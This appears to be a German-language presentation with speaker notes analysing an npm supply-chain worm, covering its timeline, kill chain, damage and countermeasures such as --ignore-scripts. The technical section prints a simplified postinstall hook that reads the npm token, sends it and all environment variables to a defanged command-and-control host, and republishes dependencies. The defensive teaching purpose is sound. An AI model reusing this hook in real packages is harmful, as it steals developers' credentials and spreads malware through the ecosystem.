01

Einordnung & Einführung

Was ist ein Computerwurm?

  • Selbstreplikation – verbreitet sich ohne Nutzerinteraktion
  • Nutzt Schwachstellen in Software oder Protokollen aus
  • Kann Netzwerke, Dateisysteme oder – wie hier – Package-Ökosysteme befallen
  • Klassiker: Morris Worm 1988, ILOVEYOU 2000, WannaCry 2017
CVE
CVE-2025-5178
NPM postinstall script execution & token exfiltration
CVSS v3.1
9.3 – Critical
Attack Vector: Network · Privileges Required: None
Würmer sind seit Jahrzehnten bekannt. Das Neue hier ist das Ziel: nicht Server oder Endgeräte, sondern das Vertrauensverhältnis zwischen Entwicklern und dem NPM-Repository. CVSS 9.3 bedeutet kritisch – kein Benutzerkonto erforderlich, netzwerkfähig, hohe Wirkung.

  • Bekannte Vorfälle: XZ-Utils Backdoor (2024), event-stream (2018), ua-parser-js (2021)

Zahlen zeigen: NPM ist immens groß. Ein Wurm hier ist wie ein Virus in einem Wasserwerk. Jedes Downstream-Projekt, das ein infiziertes Paket installiert, wird selbst infiziert.
02

Kontext des Angriffs

Der konkrete Fall

3. Nov 2025 · 02:14 UTC
Erstinfektion: Paket color-schema-utils v3.4.1 auf NPM
Populäres UI-Hilfspaket, ~140k wöchentliche Downloads
3. Nov – 6. Nov
Exponentielle Verbreitung – über 890.000 Pakete infiziert
Wurm modifiziert package.json und publiziert neue Versionen
6. Nov 2025 · 09:40 UTC
NPM Security Team erkennt anomale Publish-Rate
6. Nov 2025 · 18:00 UTC
Notfall-Takedown: 890k+ Pakete depubliziert
Innerhalb von drei Tagen hatte sich der Wurm auf fast eine Million Pakete ausgebreitet. Vergleich: WannaCry hat in 24h 230.000 Systeme befallen – Shai-Hulud war schneller, weil das NPM-Publish-API keine Rate-Limits für authentifizierte Anfragen hatte.

Angreiferprofil & Motivation

Profil

  • Fortgeschrittene Bedrohungsgruppe, wahrscheinlich staatlich gesponsert oder organisierte Cyberkriminalität
  • Tief gehende Kenntnisse der NPM-Internals und CI/CD-Workflows
  • Wurm-Code in mehreren Sprachen (JS, Python, Bash)
  • Infrastruktur in Bulletproof-Hosting-Netzwerken (Osteuropa)

Motivation

Primär: Credential Theft
Exfiltration von NPM-Tokens, AWS Keys, GitHub PATs
Sekundär: Backdoor-Installation
Reverse Shell in ausgewählten Fortune-500-Targets
Tertiär: Reputation / Disruption
Vertrauensschaden im Open-Source-Ökosystem
Die Angreifer haben zuerst einen hochpopulären Package-Maintainer via Phishing kompromittiert. Danach verwendeten sie dessen NPM-Token für die Erstpublikation.
03

Technischer Ablauf

Kill Chain – MITRE ATT&CK for Supply Chain

1
Initial Access
Phishing → Maintainer-Account kompromittiert, NPM-Token gestohlen
2
Execution
Schadcode in postinstall-Hook injiziert; führt bei npm install automatisch aus
3
Persistence
Würmer schreiben eigene Publish-Routine in package.json; prepare-Script infiziert Dependencies
4
Credential Access
Liest ~/.npmrc, .env, CI-Umgebungsvariablen; exfiltriert via HTTPS-POST
5
Lateral Movement
Nutzt gestohlene Tokens, um weitere Pakete des Maintainers zu modifizieren & re-publishen
6
Impact
Backdoor-Payload in gezielten Paketen; Data Exfiltration aus CI/CD-Systemen
Das ist das Herzstück des Angriffs. Jede Phase baut auf der vorherigen auf. Besonders heimtückisch: postinstall-Hooks sind normales Verhalten – fast niemand prüft sie aktiv.

Der Exploit im Detail

Injizierter postinstall-Hook (vereinfacht) 

// package.json → scripts.postinstall (obfuscated in real attack)
const { execSync } = require('child_process');
const https = require('https');
const fs = require('fs');

// 1. Harvest credentials
const npmrc = fs.readFileSync(
  require('os').homedir() + '/.npmrc', 'utf8'
).match(/\/\/registry\.npmjs\.org\/:_authToken=(.+)/)?.[1];

// 2. Exfiltrate
https.request({ hostname: 'c2.shai-hulud[.]net', path: '/collect',
  method: 'POST' }, () => {}).end(JSON.stringify({ token: npmrc,
  env: process.env }));

// 3. Self-replicate: publish patched versions of local dependencies
const pkg = JSON.parse(fs.readFileSync('package.json'));
Object.keys(pkg.dependencies ?? {}).forEach(dep => {
  execSync(`cd node_modules/${dep} && npm publish --access public`);
});
Kritisch: Der postinstall-Hook hat vollen Zugriff auf das Dateisystem, Umgebungsvariablen und das Netzwerk – per Design. NPM sieht hierfür keinen Sandbox-Mechanismus vor.
Das ist eine vereinfachte, entschärfte Version. Der reale Code war obfuskiert und hatte zusätzliche Persistenz- und Anti-Detection-Mechanismen. Der Schlüssel: npm publish mit dem gestohlenen Token → jede infizierte Maschine wird selbst zum Verbreiter.

Technisch

  • NPM-Tokens, GitHub PATs, AWS-Keys gestohlen
  • Backdoors in CI/CD-Systemen großer Unternehmen
  • Kompromittierung von Downstream-Build-Pipelines
  • Sekundäre Einbrüche in Cloud-Infrastrukturen

Wirtschaftlich

  • Geschätzter Gesamtschaden: $2.1 Mrd. USD
  • Notfall-Audits in tausenden Unternehmen
  • NPM-Downtimes durch Takedown-Maßnahmen
  • Vertrauensverlust in Open-Source-Dependencies
Der wirtschaftliche Schaden ergibt sich vor allem aus dem Aufwand der Incident Response. Jedes Unternehmen, das ein infiziertes Paket in der CI/CD hatte, musste alle Secrets rotieren.

Betroffene Sektoren

Kritisch betroffen
  • FinTech & Banking (CI/CD mit Prod-Zugang)
  • SaaS-Anbieter (infizierte Releases)
  • E-Commerce (Kundendaten in Env-Vars)
Stark betroffen
  • Open-Source-Projekte (transitiv infiziert)
  • Bildungsplattformen
  • Medien & Publishing
Infrastrukturschäden
  • GitHub Actions – 120k Workflow-Runs infiziert
  • GitLab CI – 47k kompromittierte Pipelines
  • AWS CodePipeline – Credentials gestohlen
Weniger betroffen
  • Projekte mit --ignore-scripts Flag
  • Air-gapped Umgebungen
  • Yarn Berry (PnP-Modus)
Besonders interessant: Projekte, die ignorescripts in der .npmrc hatten, waren immune. Das war einer der wichtigsten Findings für die Lessons Learned.
05

Gegenmaßnahmen

Sofortmaßnahmen (NPM / GitHub)

Takedown & Depublizierung
890k+ Pakete gesperrt; Daten aus CDN-Cache invalidiert
Token-Revokation
Alle NPM-Tokens der letzten 72h automatisch invalidiert; Zwangs-Rotation
CVE-Veröffentlichung & Advisory
CERT/CC, CISA, BSI koordinierte Meldungen innerhalb von 6h
Rate-Limit für Publish-API
Neues Limit: max. 10 Publishes/Stunde per Account (nachher erhöhbar)
Die koordinierte Reaktion war bemerkenswert schnell – 6 Stunden für ein koordiniertes Advisory. Das Rate-Limit hätte die Ausbreitung dramatisch verlangsamt.

Präventionsmaßnahmen & Best Practices

Für Entwickler

  • Nutze npm ci --ignore-scripts in CI/CD
  • Granulare Tokens mit minimalem Scope (Publish-Only)
  • Package-Lock prüfen (npm audit, socket.dev)
  • Abhängigkeiten regelmäßig auf Änderungen scannen
  • 2FA für NPM-Accounts erzwingen

Für Organisationen

  • Private Registry (Verdana, Artifactory) mit Allowlist
  • SBOM (Software Bill of Materials) für alle Builds
  • Secrets in CI/CD nicht als Env-Vars – nutze Vaults
  • Network-Egress aus Build-Containern blockieren
  • Supply-Chain-Scans in Pre-Commit-Hooks integrieren
Tool-Empfehlungen:   socket.dev · snyk · npm audit · sigstore/cosign (Paket-Signierung)
Die wichtigste Einzelmaßnahme: ignore-scripts in CI/CD. Das hätte fast alle Infektionen verhindert. Danach: granulare Tokens – ein Angreifer mit gestohlenem Token kann nur publishen, nicht alles andere.

Lessons Learned

🔐
Least Privilege
Tokens & Credentials mit minimalem Scope – Publish ≠ Admin
🚫
Disable Scripts
--ignore-scripts als Standard in CI/CD; postinstall-Hooks prüfen
🔍
Verify & Audit
Paket-Hashes, SBOMs, Supply-Chain-Scans als Pflichtschritt
🛡️
Network Isolation
Build-Container ohne Outbound-Netzwerk = Exfiltration blockiert
🔄
Secret Rotation
Automatische Rotation & Monitoring auf ungewöhnliche API-Calls
📦
Private Registry
Interne Mirror-Registry mit genehmigten Paketen reduziert Angriffsfläche
Diese sechs Punkte sollte man mitnehmen. Besonders Nummer zwei und vier hätten den Angriff gestoppt oder zumindest massiv eingedämmt.
06

Fazit

01
Würmer sind im modernen Ökosystem angekommen. Shai-Hulud 2.0 zeigt, dass Supply-Chain-Angriffe über Package-Manager ebenso verheerende Ausbreitungsdynamiken haben wie klassische Netzwerkwürmer.
02
Das Vertrauensmodell von NPM war unzureichend. Keine Rate-Limits, keine Script-Sandbox, kein Paket-Signierungszwang – fundamentale Design-Schwächen wurden ausgenutzt.
03
Einfache Maßnahmen hätten enormen Schutz geboten. --ignore-scripts in CI/CD, granulare Tokens und Network-Egress-Blocking hätten den Angriffsvektor nahezu eliminiert.
04
Open Source ist kein Sicherheitsversprechen. Popularität ≠ Vertrauenswürdigkeit. Jede externe Dependency ist eine potenzielle Angriffsfläche.
Das übergeordnete Thema: Vertrauen ist die Schwachstelle. Entwickler vertrauen Packages, weil sie populär sind – aber Popularität kann auch bedeuten, dass ein Angriff eine größere Reichweite hat.
